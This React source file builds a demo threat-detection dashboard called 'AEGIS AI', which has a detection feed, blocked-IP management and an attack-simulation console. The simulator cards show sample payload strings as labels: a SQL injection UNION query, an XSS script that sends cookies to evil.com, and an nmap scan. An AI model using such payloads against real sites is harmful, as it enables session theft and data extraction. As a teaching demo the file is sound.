import { useState, useEffect, useRef, useCallback } from "react";

const WS_URL = "ws://localhost:8000/ws";
const API_URL = "http://localhost:8000/api";

const STATUS_COLOR = { BLOCKED: "#ff3b3b", ALLOWED: "#00ff88", FLAGGED: "#ffcc00" };
const fmtTime = iso => new Date(iso).toLocaleTimeString();
const fmtConf = v => `${parseFloat(v||0).toFixed(1)}%`;

function Sparkline({ data, color }) {
  if (!data?.length) return null;
  const max = Math.max(...data, 1);
  const w = 80, h = 28;
  const pts = data.map((v, i) => `${(i/(data.length-1))*w},${h-(v/max)*(h-4)}`).join(" ");
  return <svg width={w} height={h} style={{opacity:0.7}}><polyline fill="none" stroke={color} strokeWidth="1.5" points={pts}/></svg>;
}

function AlertToast({ alerts, onDismiss }) {
  return (
    <div style={{position:"fixed",top:72,right:20,zIndex:999,display:"flex",flexDirection:"column",gap:8}}>
      {alerts.map(a=>(
        <div key={a.id} style={{background:"#0d1a0d",border:"1px solid #ff3b3b",borderLeft:"4px solid #ff3b3b",borderRadius:6,padding:"12px 16px",minWidth:320,maxWidth:380,animation:"slideInRight 0.3s ease",boxShadow:"0 0 30px rgba(255,59,59,0.2)"}}>
          <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
            <span style={{fontSize:12,color:"#ff3b3b",letterSpacing:1}}>🚨 ATTACK BLOCKED</span>
            <button onClick={()=>onDismiss(a.id)} style={{background:"none",border:"none",color:"#3a5068",cursor:"pointer",fontSize:14}}>✕</button>
          </div>
          <div style={{fontSize:11,color:"#c8d6e5"}}>{a.src_ip} → {a.dst_ip}</div>
          <div style={{fontSize:11,color:"#ffcc00",marginTop:2}}>{a.attack_type} • {fmtConf(a.confidence)} confidence</div>
          <div style={{fontSize:10,color:"#3a5068",marginTop:4}}>📧 Email alert sent</div>
        </div>
      ))}
    </div>
  );
}

function StatCard({label,value,color,icon,spark,prev}){
  const delta=(value||0)-(prev||0);
  return(
    <div style={{background:"rgba(255,255,255,0.025)",border:`1px solid ${color}22`,borderRadius:10,padding:"22px 24px",position:"relative",overflow:"hidden"}}>
      <div style={{position:"absolute",top:-8,right:-8,fontSize:64,opacity:0.04,color}}>{icon}</div>
      <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start"}}>
        <div>
          <div style={{fontSize:10,letterSpacing:3,color:"#3a5068",marginBottom:10}}>{label}</div>
          <div style={{fontFamily:"'Orbitron',monospace",fontSize:34,fontWeight:700,color,letterSpacing:1}}>{(value||0).toLocaleString()}</div>
          {delta>0&&<div style={{fontSize:10,color,marginTop:6,opacity:0.7}}>+{delta} new</div>}
        </div>
        <Sparkline data={spark} color={color}/>
      </div>
      <div style={{height:2,background:`${color}33`,borderRadius:2,marginTop:14}}>
        <div style={{height:"100%",background:color,borderRadius:2,width:"60%",opacity:0.5}}/>
      </div>
    </div>
  );
}

export default function App(){
  const [tab,setTab]=useState("dashboard");
  const [stats,setStats]=useState({total:0,blocked:0,allowed:0,flagged:0,attack_types:{}});
  const [prevStats,setPrevStats]=useState({});
  const [detections,setDetections]=useState([]);
  const [blockedIPs,setBlockedIPs]=useState([]);
  const [toasts,setToasts]=useState([]);
  const [wsStatus,setWsStatus]=useState("connecting");
  const [modelInfo,setModelInfo]=useState(null);
  const [simulating,setSimulating]=useState(false);
  const [simResult,setSimResult]=useState(null);
  const [spark,setSpark]=useState({total:[],blocked:[]});
  const wsRef=useRef(null);
  const toastId=useRef(0);

  const connectWS=useCallback(()=>{
    try{
      const ws=new WebSocket(WS_URL);
      wsRef.current=ws;
      ws.onopen=()=>setWsStatus("connected");
      ws.onmessage=(e)=>{
        const data=JSON.parse(e.data);
        if(data.type==="init"||data.type==="update"){
          setPrevStats(s=>({...s,...stats}));
          if(data.stats) setStats(prev=>({...prev,...data.stats}));
          setSpark(s=>({
            total:[...(s.total||[]),data.stats?.total||0].slice(-20),
            blocked:[...(s.blocked||[]),data.stats?.blocked||0].slice(-20),
          }));
          if(data.detections) setDetections(data.detections);
          if(data.blocked_ips) setBlockedIPs(data.blocked_ips);
          if(data.recent){
            setDetections(prev=>{
              const merged=[...data.recent,...prev];
              const seen=new Set();
              return merged.filter(d=>{const k=d.timestamp+d.src_ip;if(seen.has(k))return false;seen.add(k);return true;}).slice(0,100);
            });
            data.recent.filter(d=>d.blocked||d.status==="BLOCKED").forEach(d=>{
              const id=++toastId.current;
              setToasts(t=>[...t,{...d,id}]);
              setTimeout(()=>setToasts(t=>t.filter(x=>x.id!==id)),6000);
            });
          }
        }
      };
      ws.onclose=()=>{setWsStatus("disconnected");setTimeout(connectWS,3000);};
      ws.onerror=()=>setWsStatus("error");
    }catch(e){setWsStatus("error");}
  },[]);

  useEffect(()=>{
    connectWS();
    fetch(`${API_URL}/model-info`).then(r=>r.json()).then(setModelInfo).catch(()=>{});
    const poll=setInterval(()=>{
      fetch(`${API_URL}/detections?limit=50`).then(r=>r.json()).then(d=>setDetections(d.detections||[])).catch(()=>{});
      fetch(`${API_URL}/blocked-ips`).then(r=>r.json()).then(d=>setBlockedIPs(d.blocked_ips||[])).catch(()=>{});
      fetch(`${API_URL}/stats`).then(r=>r.json()).then(d=>setStats(prev=>({...prev,...d}))).catch(()=>{});
    },3000);
    return()=>clearInterval(poll);
  },[connectWS]);

  async function simulate(type){
    setSimulating(true);setSimResult(null);
    try{
      const randIP=()=>`${Math.floor(Math.random()*200+10)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)+1}`;
      const res=await fetch(`${API_URL}/simulate`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({attack_type:type,src_ip:randIP()})});
      const data=await res.json();
      setSimResult(data);
      setDetections(prev=>[{...data,status:"BLOCKED",attack_type:type,timestamp:new Date().toISOString()},...prev].slice(0,100));
      setStats(prev=>({...prev,total:prev.total+1,blocked:prev.blocked+1}));
    }catch(e){setSimResult({error:"Backend not running! Run: uvicorn app:app --reload"});}
    setSimulating(false);
  }

  const ATTACKS=["DDoS","Port Scan","SQL Injection","XSS","Brute Force","CSRF"];
  const ATTACK_COLORS=["#ff3b3b","#ff6b35","#ffcc00","#00e5ff","#7c3aed","#ec4899"];
  const attackBars=Object.entries(stats.attack_types||{});
  const maxAttack=Math.max(...attackBars.map(([,v])=>v),1);
  const wsColor={connected:"#00ff88",connecting:"#ffcc00",disconnected:"#ff3b3b",error:"#ff3b3b"};
  const threatRatio=stats.total?stats.blocked/stats.total:0;
  const threatLevel=threatRatio>0.5?"CRITICAL":threatRatio>0.3?"HIGH":threatRatio>0.15?"MODERATE":"LOW";
  const threatColor={CRITICAL:"#ff3b3b",HIGH:"#ff6b35",MODERATE:"#ffcc00",LOW:"#00ff88"}[threatLevel];

  const FEATURES=["dur","proto","service","state","spkts","dpkts","sbytes","dbytes","rate","sttl","dttl","sload","dload","sloss","dloss","sinpkt","dinpkt","sjit","djit","swin","stcpb","dtcpb","dwin","tcprtt","synack","ackdat","smean","dmean","trans_depth","response_body_len","ct_srv_src","ct_state_ttl","ct_dst_ltm","ct_src_dport_ltm","ct_dst_sport_ltm","ct_dst_src_ltm","is_ftp_login","ct_ftp_cmd","ct_flw_http_mthd","ct_src_ltm","ct_srv_dst","is_sm_ips_ports"];

  return(
    <div style={{minHeight:"100vh",background:"#030a0f",color:"#c8d6e5",fontFamily:"'Share Tech Mono',monospace",overflow:"hidden"}}>
      <div style={{position:"fixed",inset:0,zIndex:0,backgroundImage:"linear-gradient(rgba(0,255,136,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,0.03) 1px,transparent 1px)",backgroundSize:"48px 48px",pointerEvents:"none"}}/>
      <div style={{position:"fixed",inset:0,zIndex:0,backgroundImage:"repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.04) 2px,rgba(0,0,0,0.04) 4px)",pointerEvents:"none"}}/>
      <AlertToast alerts={toasts} onDismiss={id=>setToasts(t=>t.filter(x=>x.id!==id))}/>

      <header style={{position:"relative",zIndex:10,borderBottom:"1px solid rgba(0,255,136,0.12)",background:"rgba(3,10,15,0.97)",backdropFilter:"blur(12px)",padding:"0 28px",display:"flex",alignItems:"center",justifyContent:"space-between",height:64}}>
        <div style={{display:"flex",alignItems:"center",gap:14}}>
          <div style={{position:"relative",width:44,height:44}}>
            {[["top:0,left:0","borderTop,borderLeft"],["top:0,right:0","borderTop,borderRight"],["bottom:0,left:0","borderBottom,borderLeft"],["bottom:0,right:0","borderBottom,borderRight"]].map(([pos,borders],i)=>{
              const p=Object.fromEntries(pos.split(",").map(s=>s.split(":")));
              const b=Object.fromEntries(borders.split(",").map(s=>[s,"2px solid #00ff88"]));
              return <div key={i} style={{position:"absolute",...p,width:14,height:14,...b}}/>;
            })}
            <div style={{position:"absolute",inset:6,display:"flex",alignItems:"center",justifyContent:"center",fontSize:18,color:"#00ff88"}}>⚔</div>
          </div>
          <div>
            <div style={{fontFamily:"'Orbitron',monospace",fontSize:18,fontWeight:900,color:"#00ff88",letterSpacing:3}}>AEGIS AI</div>
            <div style={{fontSize:9,color:"#2d4558",letterSpacing:4}}>THREAT INTELLIGENCE PLATFORM</div>
          </div>
        </div>
        <nav style={{display:"flex",gap:4}}>
          {["dashboard","detections","simulator","blocked","model"].map(t=>(
            <button key={t} onClick={()=>setTab(t)} style={{padding:"7px 18px",borderRadius:3,border:`1px solid ${tab===t?"#00ff88":"rgba(255,255,255,0.07)"}`,background:tab===t?"rgba(0,255,136,0.08)":"transparent",color:tab===t?"#00ff88":"#3a5068",cursor:"pointer",fontFamily:"'Share Tech Mono',monospace",fontSize:11,letterSpacing:1,textTransform:"uppercase",transition:"all 0.2s"}}>{t}</button>
          ))}
        </nav>
        <div style={{display:"flex",alignItems:"center",gap:20}}>
          <div style={{display:"flex",alignItems:"center",gap:8}}>
            <div style={{width:7,height:7,borderRadius:"50%",background:wsColor[wsStatus],boxShadow:`0 0 8px ${wsColor[wsStatus]}`,animation:"pulse 1.5s infinite"}}/>
            <span style={{fontSize:10,color:wsColor[wsStatus],letterSpacing:1}}>{wsStatus==="connected"?"LIVE":wsStatus.toUpperCase()}</span>
          </div>
          <div style={{display:"flex",alignItems:"center",gap:8}}>
            <div style={{width:7,height:7,borderRadius:"50%",background:"#00ff88",animation:"pulse 2s infinite"}}/>
            <span style={{fontSize:10,color:"#00ff88",letterSpacing:1}}>RULE-BASED DEMO</span>
          </div>
          <div style={{padding:"5px 14px",borderRadius:3,border:`1px solid ${threatColor}`,color:threatColor,fontSize:10,letterSpacing:1}}>⚠ THREAT: {threatLevel}</div>
        </div>
      </header>

      <main style={{position:"relative",zIndex:1,padding:"24px 28px",maxWidth:1440,margin:"0 auto"}}>

        {tab==="dashboard"&&(
          <div>
            <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:16,marginBottom:24}}>
              <StatCard label="TOTAL CONNECTIONS" value={stats.total} color="#00e5ff" icon="◈" spark={spark.total} prev={prevStats.total}/>
              <StatCard label="ATTACKS BLOCKED" value={stats.blocked} color="#ff3b3b" icon="🛡" spark={spark.blocked} prev={prevStats.blocked}/>
              <StatCard label="FLAGGED" value={stats.flagged||0} color="#ffcc00" icon="⚠" spark={[]} prev={0}/>
              <StatCard label="ALLOWED" value={stats.allowed} color="#00ff88" icon="✓" spark={[]} prev={prevStats.allowed}/>
            </div>
            <div style={{display:"grid",gridTemplateColumns:"1fr 340px",gap:16}}>
              <div style={{background:"rgba(255,255,255,0.025)",border:"1px solid rgba(0,255,136,0.1)",borderRadius:8,overflow:"hidden"}}>
                <div style={{padding:"13px 20px",borderBottom:"1px solid rgba(255,255,255,0.05)",display:"flex",alignItems:"center",gap:8}}>
                  <div style={{width:6,height:6,borderRadius:"50%",background:"#00ff88",boxShadow:"0 0 6px #00ff88",animation:"pulse 1.5s infinite"}}/>
                  <span style={{fontSize:11,letterSpacing:2,color:"#3a5068"}}>REAL-TIME DETECTION FEED</span>
                  <span style={{marginLeft:"auto",fontSize:10,color:"#2d4558"}}>{detections.length} logged</span>
                </div>
                <div style={{overflowY:"auto",maxHeight:420}}>
                  <div style={{display:"grid",gridTemplateColumns:"100px 130px 130px 70px 70px 80px",gap:8,padding:"7px 16px",borderBottom:"1px solid rgba(255,255,255,0.05)",fontSize:9,color:"#2d4558",letterSpacing:1}}>
                    <span>TIME</span><span>SRC IP</span><span>DST IP</span><span>PROTO</span><span>CONF</span><span>STATUS</span>
                  </div>
                  {detections.slice(0,20).map((d,i)=>(
                    <div key={i} style={{display:"grid",gridTemplateColumns:"100px 130px 130px 70px 70px 80px",gap:8,padding:"8px 16px",borderBottom:"1px solid rgba(255,255,255,0.025)",fontSize:10,alignItems:"center",background:d.blocked?"rgba(255,59,59,0.03)":"transparent",animation:i===0?"slideIn 0.3s ease":"none"}}>
                      <span style={{color:"#2d4558"}}>{fmtTime(d.timestamp)}</span>
                      <span style={{color:d.blocked?"#ff6b35":"#5a7a8a",fontFamily:"monospace"}}>{d.src_ip}</span>
                      <span style={{color:"#3a5068",fontFamily:"monospace"}}>{d.dst_ip}</span>
                      <span style={{color:"#4a6278",textTransform:"uppercase"}}>{d.proto}</span>
                      <span style={{color:parseFloat(d.confidence)>80?"#ff6b35":"#3a5068"}}>{fmtConf(d.confidence)}</span>
                      <span style={{padding:"2px 6px",borderRadius:2,fontSize:9,background:`${STATUS_COLOR[d.status]||"#3a5068"}22`,color:STATUS_COLOR[d.status]||"#3a5068",letterSpacing:1,textAlign:"center"}}>{d.status}</span>
                    </div>
                  ))}
                  {detections.length===0&&(
                    <div style={{padding:40,textAlign:"center",color:"#2d4558",fontSize:12}}>
                      Waiting for network traffic...<br/>
                      <span style={{fontSize:10,marginTop:8,display:"block"}}>Run backend as Administrator</span>
                    </div>
                  )}
                </div>
              </div>
              <div style={{display:"flex",flexDirection:"column",gap:14}}>
                <div style={{background:"rgba(255,255,255,0.025)",border:"1px solid rgba(255,255,255,0.06)",borderRadius:8,padding:20}}>
                  <div style={{fontSize:10,letterSpacing:2,color:"#3a5068",marginBottom:16}}>ATTACK BREAKDOWN</div>
                  {ATTACKS.map((name,i)=>{
                    const count=stats.attack_types?.[name]||0;
                    const pct=Math.max(4,(count/maxAttack)*100);
                    return(
                      <div key={name} style={{marginBottom:11}}>
                        <div style={{display:"flex",justifyContent:"space-between",marginBottom:4,fontSize:11}}>
                          <span style={{color:"#5a7a8a"}}>{name}</span>
                          <span style={{color:ATTACK_COLORS[i]}}>{count}</span>
                        </div>
                        <div style={{height:3,background:"rgba(255,255,255,0.05)",borderRadius:2}}>
                          <div style={{height:"100%",width:`${pct}%`,background:ATTACK_COLORS[i],borderRadius:2,transition:"width 0.6s ease"}}/>
                        </div>
                      </div>
                    );
                  })}
                </div>
                <div style={{background:"rgba(0,255,136,0.03)",border:"1px solid rgba(0,255,136,0.15)",borderRadius:8,padding:18}}>
                  <div style={{fontSize:10,letterSpacing:2,color:"#00ff88",marginBottom:14}}>DETECTION MODE</div>
                  {[["Mode","Rule-based simulation"],["ML inference","Not connected"],["Blocked IPs",blockedIPs.length],["Active Alerts",toasts.length]].map(([l,v])=>(
                    <div key={l} style={{display:"flex",justifyContent:"space-between",padding:"6px 0",borderBottom:"1px solid rgba(255,255,255,0.04)",fontSize:11}}>
                      <span style={{color:"#2d4558"}}>{l}</span>
                      <span style={{color:"#c8d6e5"}}>{v}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {tab==="detections"&&(
          <div style={{background:"rgba(255,255,255,0.025)",border:"1px solid rgba(255,255,255,0.06)",borderRadius:8,overflow:"hidden"}}>
            <div style={{padding:"13px 20px",borderBottom:"1px solid rgba(255,255,255,0.05)"}}>
              <span style={{fontSize:11,letterSpacing:2,color:"#3a5068"}}>ALL DETECTIONS ({detections.length})</span>
            </div>
            <div style={{overflowX:"auto",maxHeight:640,overflowY:"auto"}}>
              <table style={{width:"100%",borderCollapse:"collapse",fontSize:11}}>
                <thead>
                  <tr style={{borderBottom:"1px solid rgba(255,255,255,0.07)"}}>
                    {["TIME","SRC IP","DST IP","SPORT","DPORT","PROTO","TYPE","CONFIDENCE","BYTES↑","BYTES↓","STATUS"].map(h=>(
                      <th key={h} style={{padding:"10px 14px",textAlign:"left",color:"#2d4558",letterSpacing:1,fontWeight:400,whiteSpace:"nowrap"}}>{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {detections.map((d,i)=>(
                    <tr key={i} style={{borderBottom:"1px solid rgba(255,255,255,0.025)",background:d.blocked?"rgba(255,59,59,0.02)":"transparent"}}>
                      <td style={{padding:"7px 14px",color:"#2d4558",whiteSpace:"nowrap"}}>{fmtTime(d.timestamp)}</td>
                      <td style={{padding:"7px 14px",color:d.blocked?"#ff6b35":"#5a7a8a",fontFamily:"monospace"}}>{d.src_ip}</td>
                      <td style={{padding:"7px 14px",color:"#3a5068",fontFamily:"monospace"}}>{d.dst_ip}</td>
                      <td style={{padding:"7px 14px",color:"#2d4558"}}>{d.src_port}</td>
                      <td style={{padding:"7px 14px",color:"#2d4558"}}>{d.dst_port}</td>
                      <td style={{padding:"7px 14px",color:"#4a6278",textTransform:"uppercase"}}>{d.proto}</td>
                      <td style={{padding:"7px 14px",color:d.attack_type==="NORMAL"?"#2d4558":"#fbbf24"}}>{d.attack_type}</td>
                      <td style={{padding:"7px 14px",color:parseFloat(d.confidence)>80?"#ff6b35":"#3a5068"}}>{fmtConf(d.confidence)}</td>
                      <td style={{padding:"7px 14px",color:"#2d4558"}}>{(d.bytes_sent||0).toLocaleString()}</td>
                      <td style={{padding:"7px 14px",color:"#2d4558"}}>{(d.bytes_recv||0).toLocaleString()}</td>
                      <td style={{padding:"7px 14px"}}>
                        <span style={{padding:"2px 8px",borderRadius:2,fontSize:9,background:`${STATUS_COLOR[d.status]||"#3a5068"}22`,color:STATUS_COLOR[d.status]||"#3a5068",letterSpacing:1}}>{d.status}</span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {tab==="simulator"&&(
          <div>
            <div style={{marginBottom:20}}>
              <div style={{fontSize:13,color:"#5a7a8a",marginBottom:4}}>ATTACK SIMULATION CONSOLE</div>
              <div style={{fontSize:11,color:"#2d4558"}}>Simulated events use caller-selected rules and illustrative scores; no ML inference or real attack traffic is used.</div>
            </div>
            <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:16,marginBottom:20}}>
              {[
                {name:"DDoS",icon:"🌊",desc:"Flood server with massive traffic from distributed botnet",payload:"10,000 req/sec | SYN flood | spkts:10000"},
                {name:"Port Scan",icon:"🔍",desc:"Systematically probe all ports to map network attack surface",payload:"SYN scan ports 1-65535 | nmap -sS"},
                {name:"SQL Injection",icon:"💉",desc:"Inject SQL to manipulate database and extract sensitive data",payload:"' UNION SELECT * FROM users--"},
                {name:"XSS",icon:"🔮",desc:"Cross-site script injection to steal session cookies",payload:"<script>document.location='//evil.com?c='+document.cookie</script>"},
                {name:"Brute Force",icon:"🔓",desc:"Credential stuffing and password spraying on login endpoints",payload:"POST /login x5000 | admin:wordlist"},
                {name:"CSRF",icon:"🎭",desc:"Cross-site request forgery to perform unauthorized transactions",payload:"POST /transfer?amount=99999&to=attacker"},
              ].map(({name,icon,desc,payload})=>(
                <div key={name} style={{background:"rgba(255,255,255,0.025)",border:"1px solid rgba(255,255,255,0.07)",borderRadius:8,padding:22,transition:"border-color 0.2s"}}
                  onMouseEnter={e=>e.currentTarget.style.borderColor="rgba(255,59,59,0.35)"}
                  onMouseLeave={e=>e.currentTarget.style.borderColor="rgba(255,255,255,0.07)"}
                >
                  <div style={{fontSize:32,marginBottom:12}}>{icon}</div>
                  <div style={{fontSize:13,color:"#e0eaf2",fontWeight:600,marginBottom:8}}>{name}</div>
                  <div style={{fontSize:11,color:"#3a5068",lineHeight:1.7,marginBottom:14}}>{desc}</div>
                  <div style={{fontSize:10,color:"#2d4558",background:"rgba(0,0,0,0.3)",padding:"7px 10px",borderRadius:4,marginBottom:14,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{payload}</div>
                  <button onClick={()=>simulate(name)} disabled={simulating} style={{width:"100%",padding:9,background:"rgba(255,59,59,0.1)",border:"1px solid rgba(255,59,59,0.35)",color:"#ff3b3b",borderRadius:4,cursor:simulating?"wait":"pointer",fontFamily:"'Share Tech Mono',monospace",fontSize:11,letterSpacing:1,transition:"all 0.2s"}}>
                    {simulating?"⟳ SIMULATING...":"▶ LAUNCH ATTACK"}
                  </button>
                </div>
              ))}
            </div>
            {simResult&&(
              <div style={{background:simResult.error?"rgba(255,59,59,0.05)":"rgba(0,255,136,0.04)",border:`1px solid ${simResult.error?"rgba(255,59,59,0.3)":"rgba(0,255,136,0.25)"}`,borderRadius:8,padding:24,animation:"fadeIn 0.3s ease"}}>
                {simResult.error?(
                  <div style={{color:"#ff3b3b",fontSize:12}}>❌ {simResult.error}</div>
                ):(
                  <>
                    <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:16}}>
                      <span style={{fontSize:24}}>🛡️</span>
                      <div>
                        <div style={{fontSize:14,color:"#00ff88",letterSpacing:1}}>SIMULATED EVENT PROCESSED</div>
                        <div style={{fontSize:11,color:"#3a5068"}}>Simulation rule matched • OS firewall action attempted • Email requires configuration</div>
                      </div>
                    </div>
                    <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:12}}>
                      {[["Source IP",simResult.src_ip],["Demo score",fmtConf(simResult.confidence||0)],["Action",simResult.blocked?"Block action attempted":"Allowed"],["Email","Configured only"]].map(([l,v])=>(
                        <div key={l} style={{background:"rgba(0,0,0,0.3)",borderRadius:6,padding:"12px 14px"}}>
                          <div style={{fontSize:10,color:"#2d4558",marginBottom:4}}>{l}</div>
                          <div style={{fontSize:12,color:"#e0eaf2"}}>{v}</div>
                        </div>
                      ))}
                    </div>
                  </>
                )}
              </div>
            )}
          </div>
        )}

        {tab==="blocked"&&(
          <div style={{background:"rgba(255,255,255,0.025)",border:"1px solid rgba(255,59,59,0.15)",borderRadius:8,overflow:"hidden"}}>
            <div style={{padding:"13px 20px",borderBottom:"1px solid rgba(255,255,255,0.05)",display:"flex",justifyContent:"space-between"}}>
              <span style={{fontSize:11,letterSpacing:2,color:"#3a5068"}}>ADDRESSES WITH DEMO BLOCK ACTIONS ({blockedIPs.length})</span>
              <span style={{fontSize:10,color:"#ff3b3b"}}>DEMO BLOCK ACTIONS</span>
            </div>
            <div style={{padding:20,display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:12}}>
              {blockedIPs.map(({ip,reason,blocked_at,count})=>(
                <div key={ip} style={{background:"rgba(255,59,59,0.04)",border:"1px solid rgba(255,59,59,0.14)",borderRadius:6,padding:"12px 14px",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
                  <div>
                    <div style={{fontSize:12,color:"#e0eaf2",fontFamily:"monospace"}}>{ip}</div>
                    <div style={{fontSize:10,color:"#3a5068",marginTop:3}}>{reason} • {count}x</div>
                    <div style={{fontSize:9,color:"#2d4558",marginTop:2}}>{fmtTime(blocked_at)}</div>
                  </div>
                  <button onClick={async()=>{await fetch(`${API_URL}/blocked-ips/${ip}`,{method:"DELETE"});setBlockedIPs(prev=>prev.filter(b=>b.ip!==ip));}} style={{padding:"4px 10px",background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",color:"#3a5068",borderRadius:3,cursor:"pointer",fontSize:10,fontFamily:"'Share Tech Mono',monospace"}}>UNBLOCK</button>
                </div>
              ))}
              {blockedIPs.length===0&&<div style={{gridColumn:"1/-1",textAlign:"center",padding:40,color:"#2d4558",fontSize:12}}>No IPs blocked yet</div>}
            </div>
          </div>
        )}

        {tab==="model"&&(
          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16}}>
            <div style={{background:"rgba(0,255,136,0.03)",border:"1px solid rgba(0,255,136,0.15)",borderRadius:8,padding:24}}>
              <div style={{fontSize:11,letterSpacing:2,color:"#00ff88",marginBottom:20}}>MODEL STATUS</div>
              {[["Live detection","Rule-based simulation"],["ML inference","Not connected"],["Artifact loaded",modelInfo?.loaded?"Yes":"No"],["Evaluation metrics","Not verified"]].map(([l,v])=>(
                <div key={l} style={{display:"flex",justifyContent:"space-between",padding:"10px 0",borderBottom:"1px solid rgba(255,255,255,0.04)",fontSize:12}}>
                  <span style={{color:"#3a5068"}}>{l}</span>
                  <span style={{color:"#c8d6e5"}}>{v}</span>
                </div>
              ))}
            </div>
            <div style={{background:"rgba(255,255,255,0.025)",border:"1px solid rgba(255,255,255,0.06)",borderRadius:8,padding:24}}>
              <div style={{fontSize:11,letterSpacing:2,color:"#3a5068",marginBottom:20}}>MODEL EVALUATION</div>
              <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
                <div style={{fontSize:12,color:"#c8d6e5"}}>No verified evaluation metrics are published. The loaded artifact is not connected to the live detection flow.</div>
              </div>
            </div>
          </div>
        )}

      </main>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap');
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
        @keyframes slideIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
        @keyframes slideInRight{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
        @keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
        ::-webkit-scrollbar{width:4px;height:4px}
        ::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:2px}
      `}</style>
    </div>
  );
}
